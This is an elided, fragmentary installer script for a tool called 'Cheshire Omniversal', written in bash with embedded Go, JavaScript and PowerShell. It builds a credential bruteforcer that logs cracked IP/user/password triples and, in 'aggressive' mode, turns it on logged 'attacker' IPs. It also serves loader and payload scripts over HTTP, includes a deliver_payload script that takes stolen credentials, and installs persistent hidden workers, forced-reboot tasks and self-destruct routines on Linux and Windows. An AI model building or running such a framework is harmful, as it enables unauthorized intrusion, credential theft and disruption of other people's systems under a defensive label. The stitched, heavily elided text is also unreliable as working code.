...
func main() {
    ...
    for res := range ch {
        ...
        if f, err := os.OpenFile("/run/purple/ouroboros_fifo", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK|os.O_CREATE, 0666); err == nil {
            fmt.Fprintf(f, "BRUTE_SUCCESS|%s|%s|%s\n", res.ip, res.user, res.pass)
            f.Close()
        }
        if f, err := os.OpenFile("/run/purple/attacker_ips", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK|os.O_CREATE, 0644); err == nil {
...
const resurrectionActive = () => existsSync("/run/purple/resurrection_active");
...
# ------------------------------------------------------------
# 6. Build cheshire.sock command listener
# ------------------------------------------------------------
build_cheshire_socket() {
    cat > /usr/local/bin/cheshire_socket.sh << 'CSOCK'
#!/bin/bash
SOCK="/run/purple/cheshire.sock"
mkdir -p "$(dirname "$SOCK")"
rm -f "$SOCK"
if command -v socat &>/dev/null; then
    socat UNIX-LISTEN:"$SOCK",fork,mode=600 EXEC:"/usr/local/bin/cheshire_cmd_handler.sh"
else
    while true; do
        # Use nc -lU if available (OpenBSD), else fallback to regular nc
        if nc -h 2>&1 | grep -q "\-U"; then
            nc -lU "$SOCK" | /usr/local/bin/cheshire_cmd_handler.sh
        else
            nc -l "$SOCK" | /usr/local/bin/cheshire_cmd_handler.sh
        fi
        sleep 0.1
    done
fi
CSOCK
    ...
    cat > /usr/local/bin/cheshire_cmd_handler.sh << 'CCMD'
#!/bin/bash
read -r cmd
[[ -z "$cmd" ]] && cmd="$1"
case "$cmd" in
    aggressive)
        ( echo "CHESHIRE_MODE_AGGRESSIVE" >> /run/purple/ouroboros_fifo & )
if [[ -f /run/purple/attacker_ips ]]; then
            while IFS= read -r ip; do
                [[ -n "$ip" ]] && /usr/local/bin/bruteforcer "$ip" &
            done < /run/purple/attacker_ips
        fi
        ;;
    passive)   ( echo "CHESHIRE_MODE_PASSIVE"   >> /run/purple/ouroboros_fifo  & );;
    resurrect) ( echo "CHESHIRE_RESURRECT"       >> /run/purple/ouroboros_fifo  & );;
esac
CCMD
    chmod +x /usr/local/bin/cheshire_socket.sh /usr/local/bin/cheshire_cmd_handler.sh
}
...
# ------------------------------------------------------------
build_go_hivemind() {
    cat > /tmp/cheshire_hivemind.go << "GO_HIVE"
package main
...
func main() {
    procs := []*Proc{
        ...
        {Name: "socket", Cmd: exec.Command("/usr/local/bin/cheshire_socket.sh")},
    }
    for _, p := range procs {
        go p.run()
    }
...
GO_HIVE
    go build -o /usr/local/bin/cheshire_hivemind /tmp/cheshire_hivemind.go
    chmod +x /usr/local/bin/cheshire_hivemind
    rm -f /tmp/cheshire_hivemind.go
}
...
serve({
    ...
    fetch(req) {
        ...
        if (url.pathname === '/loader.sh' && url.searchParams.get('token') === HTTP_TOKEN) {
            const loader = readFileSync('/etc/cheshire/loader.sh', 'utf8');
        ...
        if (url.pathname === '/batman-full.sh' && url.searchParams.get('token') === HTTP_TOKEN) {
            const payload = readFileSync('/etc/cheshire/batman-full.sh', 'utf8');
...
# ------------------------------------------------------------
build_bash_helpers() {
    cat > /etc/cheshire/loader.sh << "LOADER"
#!/bin/bash
...
LOADER
    chmod +x /etc/cheshire/loader.sh

    cat > /etc/cheshire/batman-full.sh << 'BATMAN'
#!/bin/bash
set -euo pipefail
CONTROLLER_IP="${1:-}"
...
if [[ "$OS" == "linux" ]]; then
    ...
    if [[ ! -f "$COUNTER_FILE" ]]; then
        ...
        if [[ $count -ge $LIMIT ]]; then
            ...
            rm -rf /usr/local/sbin/batman-* /usr/local/bin/robin-worker
            rm -rf "$STATE_DIR"
...
MAX=3
while true; do
    ACTIVE=$(systemctl list-units --type=service --state=running | grep -c "robin-worker@")
    if (( ACTIVE < TARGET )); then
        for i in $(seq 1 $TARGET); do
            if ! systemctl is-active --quiet "robin-worker@$i.service"; then
                systemctl start "robin-worker@$i.service"
            fi
        done
    fi
    sleep 5
...
BATSUP
    ...
    cat > /usr/local/sbin/robin-worker << 'ROBIN'
#!/bin/bash
while true; do
...
ROBIN
    chmod +x /usr/local/sbin/robin-worker
...
WantedBy=multi-user.target
EOF
    cat > /etc/systemd/system/robin-worker@.service << EOF
[Unit]
Description=Robin Worker %i
BindsTo=batman-supervisor.service
[Service]
Type=simple
ExecStart=/usr/local/sbin/robin-worker %i
Restart=always
EOF
...
touch "$MARKER"
if [[ ! -f "/etc/batman-robind/jack_activated" ]]; then
    date +%s > /etc/batman-robind/jack_installed
    exit 0
fi
INSTALLED=$(cat /etc/batman-robind/jack_installed 2>/dev/null || echo 0)
NOW=$(date +%s)
...
while true; do
    ...
    if [[ $(stat -c %Y "$REAL_PATH") -gt $(stat -c %Y "$MARKER") ]]; then
        ...
        rm -f "$MARKER" /etc/batman-robind/jack_activated /etc/batman-robind/jack_installed "$REAL_PATH"
        exit 0
    fi
...
[Service]
Type=oneshot
ExecStart=/bin/sh -c 'if [[ -f /etc/batman-robind/bootcount ]] && [[ \$(cat /etc/batman-robind/bootcount) -ge 10 ]]; then touch /etc/batman-robind/jack_activated; fi'
User=$TARGET_USER
EOF
    systemctl enable batman-selfdestruct.service
    echo "Linux Batman & Robin deployed."

elif [[ "$OS" == "windows" ]]; then
    # ------------------- WINDOWS BATMAN & ROBIN -------------------
...
$state_dir = "$env:ProgramData\BatmanRobin"
...
if ($count -ge $limit) {
    Unregister-ScheduledTask -TaskName 'BatmanRobinReboot' -Confirm:$false -ErrorAction SilentlyContinue
...
$robin_script = Join-Path $state_dir 'robin.ps1'
@'
while ($true) {
...
'@ | Out-File -FilePath $robin_script -Encoding ASCII
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-File `"$robin_script`"" -PassThru
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"& { `$c = [int](Get-Content '$counter_file'); if (`$c -lt $limit) { shutdown /r /t 60 } else { Unregister-ScheduledTask -TaskName 'BatmanRobinReboot' -Confirm:0 } }`""
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "BatmanRobinReboot" -Trigger $trigger -Action $action -Force -RunLevel Highest
Write-Host "Batman & Robin installed on Windows. Boot: $count / $limit"
WINPS
...
BATMAN
    chmod +x /etc/cheshire/batman-full.sh

    cat > /etc/cheshire/deliver_payload.sh << "DELIVER"
#!/bin/bash
IP="$1"
USER="$2"
PASS="$3"
...
DELIVER
    chmod +x /etc/cheshire/deliver_payload.sh
}
...
install_systemd() {
    if [[ "$ENV" == "wsl" ]]; then
        pkg_install screen
        screen -dmS cheshire_hivemind /usr/local/bin/cheshire_hivemind
    else
        cat > /etc/systemd/system/cheshire-omniversal.service << SERVICE
[Unit]
Description=Cheshire Omniversal
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/cheshire_hivemind
Restart=always
RestartSec=1
...
SERVICE
        systemctl daemon-reload
        systemctl enable cheshire-omniversal.service
        systemctl start cheshire-omniversal.service
    fi
}
...
monitor_threats() {
    while true; do
        if bgp_hijack_detected; then
            logger -t cheshire "BGP hijack detected – activating countermeasures"
            ( echo "BGP_HIJACK" >> /run/purple/ouroboros_fifo & )
touch /run/purple/resurrection_needed;   
        fi
        if thermal_anomaly; then
            logger -t cheshire "Thermal anomaly detected – possible side‑channel attack"
...
main() {
    ...
    monitor_threats &
    SELF="$0"
    cat > /usr/local/sbin/install-cheshire-omniversal.sh << INST
#!/bin/bash
exec bash "$SELF"
INST
    chmod +x /usr/local/sbin/install-cheshire-omniversal.sh
    signal_ready cheshire
    echo "Cheshire Omniversal deployed on $ENV."
}
